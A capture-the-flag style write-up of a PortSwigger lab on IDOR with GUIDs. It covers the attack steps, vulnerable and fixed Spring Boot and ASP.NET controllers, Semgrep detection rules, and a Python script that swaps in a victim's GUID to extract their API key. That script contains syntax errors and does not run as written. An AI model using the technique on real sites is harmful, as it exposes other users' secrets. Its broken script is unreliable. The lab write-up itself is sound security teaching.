---
title: "Lab 08: User ID controlled by request parameter, with unpredictable user IDs"
date: 2025-12-17
categories: [portswigger, access_control]
tags: [IDOR, GUID] 
image: portswigger.png
media_subpath: /assets/img/posts/2025-12-17-lab07_access_control/
---

## 1. Executive Summary

**Vulnerability:** Insecure Direct Object Reference (IDOR) with GUIDs.
**Description:** The application uses long, complex GUIDs (e.g., `59b3...`) to identify users instead of sequential integers. While this prevents simple enumeration attacks, the application exposes these GUIDs in public areas (like blog author links).
**Impact:** Horizontal Privilege Escalation. Once an attacker finds a victim's GUID, they can substitute it into the "My Account" parameter to view sensitive data, proving that obfuscation is not a substitute for authorization.

## 2. The Attack

**Objective:** Steal the API key of the user `carlos`.

1. **Reconnaissance (The Leak):** I started by browsing the public blog. I saw a post written by `carlos`. I hovered over his name and noticed the link structure: `/blogs?userId=29d7c3...`. This publicly disclosed Carlos's unique GUID. I noted this down.
2. **Baselining:** I logged in as `wiener`. My account URL was `/my-account?id=59b3a1...`.
3. **Exploitation:** I captured the request to `/my-account` in Burp Repeater. I replaced my GUID with the GUID I found for `carlos`.
4. **Result:** The application loaded the account page for `carlos`.
5. **Loot:** I extracted the API Key from the response.

## 3. Code Review

**Vulnerability Analysis (Explanation):**
The code relies on the complexity of the ID for security. The developer likely thought, "No one can guess a 32-character random string, so I don't need to check permissions."

- **The Flaw:** The ID is treated as a **Bearer Token** (whoever holds the ID gets access).
- **The Reality:** IDs are references, not secrets. They often appear in URLs, logs, and public pages. Once known, the IDOR is trivial.

### Java (Spring Boot)

```java
@Controller
public class AccountController {

    @Autowired
    private UserRepository userRepository;

    // VULNERABLE: Accepts a UUID string from the URL.
    @GetMapping("/my-account")
    public String getAccount(@RequestParam("id") String userGuid, Model model) {
        
        // Lookup purely based on input. 
        // No check to see if 'userGuid' belongs to the session user.
        User user = userRepository.findByGuid(userGuid);
        
        if (user != null) {
            model.addAttribute("user", user);
            return "account_page";
        }
        return "error";
    }
}
```

**Technical Flow & Syntax Explanation:**

- **`@RequestParam("id") String userGuid`**: Spring binds the URL parameter `?id=...` to the variable `userGuid`. It does not matter if this is an Integer or a String/GUID; it's just client input.
- **`userRepository.findByGuid(userGuid)`**: The application executes a query like `SELECT * FROM Users WHERE guid = '...'`.
- **Missing Authorization**: The code lacks a comparison step. It should compare `userGuid` against the GUID stored in the user's **Session**. Without this, any valid GUID works.

### C# (ASP.NET Core)

```csharp
[Authorize]
public class AccountController : Controller
{
    // VULNERABLE: Accepts a Guid from the query string
    [HttpGet("my-account")]
    public IActionResult GetAccount(Guid id)
    {
        // Framework converts string "29d7..." to Guid object automatically
        var userProfile = _userService.GetByGuid(id);

        if (userProfile == null) return NotFound();

        return View(userProfile);
    }
}
```

**Technical Flow & Syntax Explanation:**

- **`public IActionResult GetAccount(Guid id)`**: ASP.NET Core's model binding is smart. If the URL is `?id=550e8400...`, it automatically converts that string into a C# `Guid` struct.
- **`_userService.GetByGuid(id)`**: The service fetches the record.
- **The Logic Gap**: The `[Authorize]` attribute only checks if the user is *logged in*. It does not check if the user *owns* the Guid `id` they just requested.

### Mock PR Comment

I noticed we are using the `id` parameter from the URL to fetch user details. While using GUIDs makes the IDs unguessable, it does not prevent access if the ID is leaked (e.g., in blog post links).

We should remove the `id` parameter from this endpoint entirely. Since this endpoint renders the "current user's" account, we should look up the user ID solely from the server-side `Principal` or `User.Identity` to prevent IDOR.

## 4. The Fix

**Explanation of the Fix:**
We stop asking the client "Who are you?" via the URL. We ask the **Security Context** (Session). Even if the attacker knows Carlos's GUID, they cannot inject it because the application ignores the URL parameter.

### Secure Java

```java
@GetMapping("/my-account")
// We inject 'Principal' to get the Session User
public String getAccount(Principal principal, Model model) {
    
    // SECURE: We get the username/ID from the trusted session.
    String loggedInUsername = principal.getName();
    
    // We look up the full user (including their GUID) using the session key.
    User user = userRepository.findByUsername(loggedInUsername);
    
    model.addAttribute("user", user);
    return "account_page";
}
```

**Technical Flow & Syntax Explanation:**

- **`Principal principal`**: Represents the authenticated user. This object is populated by Spring Security filters before the controller runs. It is tamper-proof from the client side.
- **`principal.getName()`**: Retrieves the unique identifier (username) stored during login.
- **Zero Trust**: We do not trust the URL. We only trust the Session.

### Secure C#

```csharp
[Authorize]
[HttpGet("my-account")]
public IActionResult GetAccount()
{
    // SECURE: Extract the GUID from the User's Claims (Session)
    // The "NameIdentifier" claim usually holds the primary ID (GUID or Int).
    var userIdClaim = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
    
    if (Guid.TryParse(userIdClaim, out Guid userGuid))
    {
        var userProfile = _userService.GetByGuid(userGuid);
        return View(userProfile);
    }
    
    return Unauthorized();
}
```

**Technical Flow & Syntax Explanation:**

- **`User.FindFirst(...)`**: Accesses the encrypted auth cookie data. The `NameIdentifier` is the standard claim for the Primary Key.
- **`Guid.TryParse`**: Safely converts the stored string claim back into a Guid object for the database lookup.
- **Isolation**: Because we pull the ID from `User` (the session) and not the method arguments, changing the URL parameters has absolutely no effect.

## 5. Automation

*A robust Python script to exploit the IDOR using a known victim GUID.*

```python
#!/usr/bin/env python3
import argparse
import re
import requests
import sys

def exploit_idor_guid(url, session_cookie, victim_guid):
	target_path = "/my-account"

	params = ("id": victim_guid)
	cookies = {"session": session_cookie}
	print(f"[*] Target: {url}{target_path}")

	print(f"[*] Exploiting with Victim GUID: {victim_guid}")

	try:
		resp = requests.get(
			f"{url.rstrip('/')}{target_path}",
			params = params,
			cookies = cookies,
			allow_redirects=True,
			timeout=10
			)
		print(f"[*] Status Code:{resp.status_code}")

		key_pattern = r"Your API Key is:\s*([A-Za-z0-9]{32,})"
		m = re.search(key_pattern, resp.text)

		if m:
			print(f"[*] SUCCESS! API KEY FOUND:{m.group{1}}")
		else:
			print("[-] API key not found in response.")
			if resp.status_code == 200:
				print(f"[*] Response snippet: {resp.text[:200]}")
	
	except Exception as e:
		print(f"[-] Error:{e}")
		sys.exit(1)

def main():
	ap = argparse.ArgumentParser(description="Exploit IDOR with GUIDs")
	ap.add_argument("url", help="Base URL of the lab (e.g., https://lab-id.web-security-academy.net)")
    ap.add_argument("session", help="Your valid session cookie")
	ap.add_argument("victim_guid", help="The GUID of the victim user (found via recon)")

	args = ap.parse_args()

	exploit_idor_guid(args.url, args.session, args.victim_guid)

if __name__ == "__main__":
	main()
```

## 6. Static Analysis (Semgrep)

*These rules detect when an application uses an input parameter directly for a database lookup without verifying ownership, even if the parameter type is a UUID/GUID.*

**The Logic**
We want to flag code where:

1. A Controller method accepts an argument (likely named `guid`, `uuid`, or `id`).
2. It uses that argument in a repository/service call.
3. It lacks a comparison with the Session user.

### Java Rule

```yaml
rules:
  - id: java-idor-guid
    languages: [java]
    message: |
      Potential IDOR detected. The controller uses a user-supplied ID/GUID 
      directly in a database lookup. Ensure the ID matches the current session.
    severity: WARNING
    patterns:
      - pattern-inside: |
          @$CONTROLLER
          class $CLASS { ... }
      # Look for UUID or String arguments used in lookups
      - pattern: |
          public $RET $METHOD(..., $TYPE $GUID, ...) {
            ...
            $REPO.$FIND(..., $GUID, ...);
            ...
          }
      - metavariable-regex:
          metavariable: $FIND
          regex: ^(find|get|load).*
```

### C# Rule

```yaml
rules:
  - id: csharp-idor-guid
    languages: [csharp]
    message: "Potential IDOR: Controller accepts Guid input and uses it for lookup without ownership check."
    severity: WARNING
    patterns:
      - pattern-inside: |
          public class $CONTROLLER : Controller { ... }
      - pattern: |
          public IActionResult $METHOD(..., Guid $ID, ...) {
            ...
            $SERVICE.$LOOKUP($ID);
            ...
          }
```
